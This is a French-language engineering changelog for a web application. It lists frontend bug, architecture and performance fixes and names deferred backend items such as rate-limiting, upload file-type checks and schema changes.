- **FE2-BUG-4 / BUG-11** 🟡 — les 4 apps (+ upload/delete photos) : `try/catch/finally` + état `loadError` affiché.
- **FE2-BUG-5** 🟡 — `MediaViewer` : `currentIndex` clampé quand `items` rétrécit.
- **FE2-BUG-6** 🟡 — `useConfirm` : un `ask()` en attente est résolu (annulé) avant réutilisation.
- **FE2-BUG-7** 🟡 — app notes : listener de clic détaché en `unmount` (plus de fuite).
- **FE2-BUG-8** 🟡 — détails contact/photo : `watch(route.params.id)` → refetch.
- **FE2-BUG-9** ⚪ — DataBrowser : plus de double-fetch au changement de filtre.
- **FE2-BUG-10** ⚪ — Escape géré au niveau document (ConfirmModal) + `stopPropagation` (ne ferme plus le viewer dessous).
- **FE2-BUG-12** ⚪ — en-tête `Authorization` gardé (`token ? … : {}`) → plus de `Bearer null`.
- **FE2-ARCH-3** 🟡 — `auth.ts` utilise `apiErrorMessage` (messages de champ à l'inscription).
- **FE2-ARCH-4** 🟡 — interface `Entry` dédupliquée (réexport unique).
- **FE2-PERF-2/3** 🟠 — `DashboardView` lazy → catalogue connecteurs + `phoenix` hors bundle eager (**index 79 kB → 41 kB**).
- **FE2-CLEAN-3** 🟡 — `formatFileSize` unique (`types.ts`), 3 copies supprimées.
- **FE2-CLEAN-5** 🟡 — titre connecteur : `<input>` + save-on-blur au lieu de `contenteditable`.

## Reporté (nécessite décision produit, dépendance, ou refactor large)

- **BE2-SEC-4** 🟠 — inscription par défaut `false` + rate-limit login/register : dépendance (Hammer/PlugAttack) + décision sur l'onboarding premier compte.
- **BE2-BUG-14** 🟡 — iCal TZID → UTC : nécessite une base de fuseaux (`tzdata`).
- **BE2-SEC-6/7** 🟡 — sels en config runtime (risque sessions) ; sniff magic-bytes upload (dépendance/logique).
- **BE2-PERF-1** 🟡 — `Notes.resolve_targets` charge tout le vault : optimisation propre = clé canonique indexée (changement de schéma).
- **BE2-PERF-5** 🟡 — export JSON en streaming (`Repo.stream` + chunked).
- **BE2-ARCH-3 / CLEAN-1** 🟡 — découpe du contexte `Connectors` / `run_import/10`.
- **FE2-ARCH-1/2, CLEAN-2, PERF-4** — collapse du framework `apps/`, réécriture de Notes en SFC, virtualisation des listes (refactors larges).
- Tables `credentials`/`settings` : migration de drop à valider (action destructive).
